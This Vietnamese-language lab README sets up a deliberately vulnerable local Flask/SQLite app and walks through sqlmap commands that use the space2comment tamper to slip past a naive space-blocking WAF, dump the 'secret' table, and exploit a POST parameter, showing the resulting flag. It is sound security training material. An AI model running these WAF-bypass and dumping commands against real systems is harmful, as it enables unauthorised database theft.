# Lab 2.3 - sqlmap va vuot WAF/filter

App Flask + sqlite co SQLi, kem mot "WAF" ngay tho: chan moi tham so query
string co KHOANG TRANG (tra 403).

- `GET /product?id=` : injection dang so, BI WAF. Vuot bang `--tamper=space2comment`
  (sqlmap thay moi space bang `/**/`).
- `POST /api/find` (code=) : injection dang chuoi, KHONG qua WAF, de minh hoa
  `--data` (sqlmap test tham so trong body POST).

Muc tieu: dung sqlmap dump bang `secret` lay FLAG du co filter space.

## Yeu cau

- Python 3, Flask, curl, va sqlmap (bai nay test voi sqlmap 1.6.4).

## Chay

```bash
PORT=8023 python3 app.py     # terminal 1
PORT=8023 bash exploit.sh    # terminal 2 (output sqlmap da duoc grep gon lai)
```

Chay tay tung lenh de xem day du, vi du:

```bash
# Khong tamper -> bi WAF, sqlmap goi y dung --tamper=space2comment
sqlmap -u "http://127.0.0.1:8023/product?id=1" --batch --technique=B

# Co tamper -> tim ra, liet ke DB/bang, dump secret
sqlmap -u "http://127.0.0.1:8023/product?id=1" --tamper=space2comment \
       --batch --dbms=sqlite --dbs --tables
sqlmap -u "http://127.0.0.1:8023/product?id=1" --tamper=space2comment \
       --batch --dbms=sqlite --dump -T secret

# Injection qua POST
sqlmap -u "http://127.0.0.1:8023/api/find" --data="code=kb01" \
       --batch --level=2 --risk=2 --dump -T secret
```

## Giai thich cac tham so sqlmap

- `-u` URL muc tieu; `--data` body POST (co `--data` thi sqlmap test tham so POST).
- `--dbs` liet ke database; `--tables` liet ke bang; `--dump -T <bang>` dump bang.
- `--level` (1-5) va `--risk` (1-3): cang cao cang thu nhieu payload/ranh gioi,
  nhung cham va "on ao" hon.
- `--tamper=<script>` bien doi payload de vuot filter. `space2comment` doi space
  thanh `/**/`. Co the viet tamper rieng (mot ham `tamper(payload)` tra payload moi).
- `--batch` tu dong tra loi mac dinh; `--flush-session` bo cache de chay lai sach.

## Ket qua

- Khong tamper: sqlmap bao "does not seem to be injectable", 403 nhieu lan,
  goi y dung `--tamper=space2comment`.
- Co tamper: tim ra boolean-based + UNION (3 cot), dump `secret`:
  `WEB{sqlmap_tamper_space2comment_bypass_waf}`.

Xem `transcript.txt` la output that (da rut gon bang grep).

## Canh bao

App co y de lo hong, chi chay local loopback, KHONG deploy ra Internet.
